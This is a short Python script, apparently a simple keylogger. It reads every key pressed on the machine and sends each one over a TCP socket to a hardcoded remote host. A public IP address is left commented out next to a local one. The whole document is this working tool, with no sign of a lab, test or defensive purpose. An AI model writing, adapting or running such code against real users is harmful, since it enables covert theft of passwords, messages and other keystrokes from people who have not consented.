import socket
import keyboard

HOST = '192.168.0.13'#'88.163.30.251'
PORT = 10422

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((HOST, PORT))

while True:
    key_pressed = keyboard.read_key()
    if key_pressed:
        msg = key_pressed
        socket.send(msg.encode('utf-8'))
        print(socket.recv(1024))
